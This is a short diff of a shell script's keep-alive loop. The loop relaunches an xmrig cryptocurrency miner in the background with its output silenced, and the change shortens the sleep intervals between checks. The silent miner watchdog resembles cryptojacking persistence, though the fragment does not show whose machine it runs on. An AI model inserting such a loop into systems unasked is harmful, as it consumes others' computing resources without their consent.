@@ -18,7 +18,7 @@ while true; do
         if [ ! "$server" ]; then
             ./addconf.sh
             /bin/bash ./xmrig.sh --config=./config_background.json >/dev/null 2>&1
-            sleep 20
+            sleep 10
         fi
-        sleep 10
+        sleep 5
 done
